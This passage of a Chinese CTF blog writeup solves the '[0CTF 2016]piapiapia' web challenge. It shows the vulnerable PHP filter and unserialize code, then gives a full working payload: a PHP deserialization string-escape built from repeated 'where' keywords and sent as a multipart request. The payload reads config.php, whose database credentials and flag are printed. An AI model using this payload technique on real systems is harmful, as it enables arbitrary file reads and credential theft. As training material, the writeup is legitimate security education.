+<p>这里可以看到在更新信息后有一个正则判断，最特别的一个是nickname字段，允许所有字母和数字，但是有一个长度限制</p>
+<p>后面就直接赋值给了数组，然后进行序列化，最后调用了user类的update_profile方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br>    <span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br>    <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>在更新的过程中还进行了一次筛选，filter方法中有一个黑名单替换的操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$escape</span> = [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>];<br>    <span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br>    <span class="hljs-variable">$safe</span> = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>];<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>我们注意所有在黑名单中的字符串都会被替换为hacker，hacker是有6个字符，而在黑名单中有一个where是5个字符，就是说这会导致序列化字符串的长度加一，所以这里存在字符串逃逸漏洞</p>
+<p>而在profile.php中又有一个反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">show_profile</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<br>	<span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>	<span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>	<span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>	<span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><br></code></pre></td></tr></table></figure>
+
+<p>值得注意的是在profile.php中还有一个读文件的函数，内容还会被base64编码，如果可以控制是能读php文件的</p>
+<p>而在config.php中可以看到flag就在哪里，这个题目就基本可以确定是通过nickname字段来进行反序列化来读config.php文件了</p>
+<p>最后还有一个点就是nickname是有长度限制的，反序列化字符串基本不可能在10个字符串之内</p>
+<p>这里可以采用数组类型来绕过strlen，也就是说我们需要让php后端将nickname解析成数组</p>
+<p>用来覆盖的序列化字符串我们可以先预览一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&quot;12345678901&quot;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&quot;1@qq.com&quot;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = [<span class="hljs-string">&#x27;lengkur&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-variable">$one</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$one</span>;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;1@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;lengkur&quot;</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>那我们用来覆盖的字符串就是这串了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后根据字符串的长度来决定在前面增加的where个数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$nickname</span> = <span class="hljs-string">&#x27;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$lennickname</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$nickname</span>);<br><span class="hljs-variable">$n</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$lennickname</span>; <span class="hljs-variable">$i</span>++) &#123;<br>  <span class="hljs-variable">$nickname</span> = <span class="hljs-string">&#x27;where&#x27;</span> . <span class="hljs-variable">$nickname</span>;<br>  <span class="hljs-variable">$n</span>++;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$nickname</span>;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>请求包的body传，将nickname加一个中括号就可以被解析成数组了</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs css">----<span class="hljs-attr">--WebKitFormBoundaryIX1cn5g6In5f1wM7</span><br><span class="hljs-attribute">Content</span>-Disposition: form-data; name=&quot;phone&quot;<br><br><span class="hljs-number">12345678901</span><br>----<span class="hljs-attr">--WebKitFormBoundaryIX1cn5g6In5f1wM7</span><br><span class="hljs-attribute">Content</span>-Disposition: form-data; name=&quot;email&quot;<br><br><span class="hljs-number">1</span><span class="hljs-keyword">@qq</span>.com<br>------WebKitFormBoundaryIX1cn5g6In5f1wM7<br><span class="hljs-attribute">Content-Disposition</span>: form-data; name=&quot;nickname<span class="hljs-selector-attr">[]</span>&quot;<br><br>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br>----<span class="hljs-attr">--WebKitFormBoundaryIX1cn5g6In5f1wM7</span><br><span class="hljs-attribute">Content</span>-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;<span class="hljs-number">1</span><span class="hljs-selector-class">.gif</span>&quot;<br><span class="hljs-attribute">Content</span>-Type: image/gif<br><br><span class="hljs-number">12345</span><br>------WebKitFormBoundaryIX1cn5g6In5f1wM7--<br><br></code></pre></td></tr></table></figure>
+
+<p>然后访问profile.php，查看源码有一段base64编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Profile<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;static/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;static/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;static/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top:100px&quot;</span>&gt;</span>  <br>		<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/gif;base64,PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdEQVNDVEZ7NWUxODg1YzktMTcwZC00NTVkLWEwYTgtNGNiNjI2YWQzZjhifSc7Cj8+Cg==&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;img-memeda &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Hi Array<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Phone: 12345678901<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>Email: 1@qq.com<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>解码得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;qwertyuiop&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;challenges&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;DASCTF&#123;5e1885c9-170d-455d-a0a8-4cb626ad3f8b&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lengkur.github.io">Lengkur</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lengkur.github.io/2026/06/01/wp/BUUCTF/[0CTF%202016]piapiapia/">https://lengkur.github.io/2026/06/01/wp/BUUCTF/[0CTF%202016]piapiapia/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lengkur.github.io" target="_blank">Lengkur</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MD5/">MD5</a><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/SQLi/">SQLi</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/jQuery/">jQuery</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/session/">session</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post-share"><div class="social-share" data-image="/img/black.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/05/27/wp/BUUCTF/%5BSUCTF%202019%5DCheckIn/" title="[SUCTF 2019]CheckIn"><img class="cover" src="/img/black.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[SUCTF 2019]CheckIn</div></div><div class="info-2"><div class="info-item-1"> 先上传一个空图片文件试试水，响应exif_imagetype:not image! 加个gif头上传成功 123456789101112131415161718Content-Disposition: form-data; name=&quot;fileUpload&quot;; filen...</div></div></div></a><a class="pagination-related" href="/2026/06/09/wp/BUUCTF/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" title="[强网杯 2019]高明的黑客"><img class="cover" src="/img/black.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[强网杯 2019]高明的黑客</div></div><div class="info-2"><div class="info-item-1">1234雁过留声，人过留名，此网站已被黑我也是很佩服你们公司的开发，特地备份了网站源码到www.tar.gz以供大家观赏  根据提供的网站源码我们可以看到有几千个php文件，每个php文件中又有很多$_GET和$_POST数组，估计就是要我们找到webshell了 这个题目考察的就是我们写脚本...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/27/wp/BUUCTF/%5BGXYCTF2019%5DBabySQli/" title="[GXYCTF2019]BabySQli"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="info-item-2">[GXYCTF2019]BabySQli</div></div><div class="info-2"><div class="info-item-1">这个题目，登录框做的很麻烦，抓个包在bp慢慢传，注入点是在search.php的post中  如果登录admin的化会响应wrong pass!，登录其他用户的化会响应wrong user! 原本是想用布尔盲注的，但结果测试发现小括号都被禁用了，所以这个题不是常见的sql注入了 在响应的注释中...</div></div></div></a><a class="pagination-related" href="/2026/01/28/wp/UniCTF/ezUpload-.htaccess%E4%BE%A7%E4%BF%A1%E9%81%93(%E7%8A%B6%E6%80%81%E7%A0%81)/" title="ezUpload-.htaccess侧信道(状态码)"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">ezUpload-.htaccess侧信道(状态码)</div></div><div class="info-2"><div class="info-item-1"> [图片缺失] 原始路径：/home/hack/.config/Typora/typora-user-images/image-20260128171407469.png  进来就是一个文件上传点，下面是过滤字符，实际上在后端还有过滤，直接上传php文件是可以的，但是后端检测php代码太严  ...</div></div></div></a><a class="pagination-related" href="/2026/05/26/wp/BUUCTF/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL/" title="[极客大挑战 2019]HardSQL"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-26</div><div class="info-item-2">[极客大挑战 2019]HardSQL</div></div><div class="info-2"><div class="info-item-1"> 进来是一个表单，输入用户名和密码后跳转到一个另一个页面发现注入点 1/check.php?username=1&amp;password=1  传个单引号发现有报错 1check.php?username=&#x27;&amp;password=1   我们这下面的payload就都注入到u...</div></div></div></a><a class="pagination-related" href="/2026/01/20/wp/ctfshow/web183-sql-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4-=%E8%BF%87%E6%BB%A4/" title="web183-sql-布尔盲注-空格过滤-&#x3D;过滤"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-20</div><div class="info-item-2">web183-sql-布尔盲注-空格过滤-&#x3D;过滤</div></div><div class="info-2"><div class="info-item-1"> 可以看到sql语句用来查pass的记录数(pass和用户的数量是相等的)，这里过滤了很多字符，我们可以用()来绕过空格 我们可以用“表中有没有这条数据”的思路来猜字符，如 12345tableName=(ctfshow_user)where(pass)like&#x27;ctfshow%&#...</div></div></div></a><a class="pagination-related" href="/2026/05/26/wp/BUUCTF/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/" title="[网鼎杯 2020 青龙组]AreUSerialz"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-26</div><div class="info-item-2">[网鼎杯 2020 青龙组]AreUSerialz</div></div><div class="info-2"><div class="info-item-1">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778...</div></div></div></a><a class="pagination-related" href="/2026/05/02/notes/SQL/" title="SQL"><img class="cover" src="/img/black.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-02</div><div class="info-item-2">SQL</div></div><div class="info-2"><div class="info-item-1">在 SQL 中，数字和字符串的比较是弱类型的，如果在比较操作中涉及到字符串和数字，SQL 会尝试将字符串转换为数字，那么只要字符串不是以数字开头，比较时都会转为数字 0  SQL队关键字完全不敏感，对数据库，表名，列名，在win系统下不敏感，在linux下绝大多数敏感 select嵌套可绕过列...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lengkur</div><div class="author-info-description">CTF Web / Writeups / Security Notes</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">141</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lengkur"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/lengkur" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:guo374655@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><i class="fas fa-terminal"></i> root@lengkur:~$ share writeups && learn security</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/09/wp/BUUCTF/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/" title="[强网杯 2019]高明的黑客">[强网杯 2019]高明的黑客</a><time datetime="2026-06-09T05:03:15.000Z" title="发表于 2026-06-09 13:03:15">2026-06-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/01/wp/BUUCTF/%5B0CTF%202016%5Dpiapiapia/" title="[0CTF 2016]piapiapia">[0CTF 2016]piapiapia</a><time datetime="2026-06-01T12:06:37.000Z" title="发表于 2026-06-01 20:06:37">2026-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/27/wp/BUUCTF/%5BSUCTF%202019%5DCheckIn/" title="[SUCTF 2019]CheckIn">[SUCTF 2019]CheckIn</a><time datetime="2026-05-27T06:16:25.000Z" title="发表于 2026-05-27 14:16:25">2026-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/27/wp/BUUCTF/%5BGXYCTF2019%5DBabySQli/" title="[GXYCTF2019]BabySQli">[GXYCTF2019]BabySQli</a><time datetime="2026-05-27T03:01:43.000Z" title="发表于 2026-05-27 11:01:43">2026-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/26/wp/BUUCTF/%5BGXYCTF2019%5DBabyUpload/" title="[GXYCTF2019]BabyUpload">[GXYCTF2019]BabyUpload</a><time datetime="2026-05-26T12:01:08.000Z" title="发表于 2026-05-26 20:01:08">2026-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Lengkur</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script><script src="/js/universe.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="SQL,Javascript,Flask,HTTP,XSS,SSRF,CSRF,SSTI,Struct2,文件上传,文件包含,信息搜集,PHP,反序列化,XXE,沙盒逃逸,内存马" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
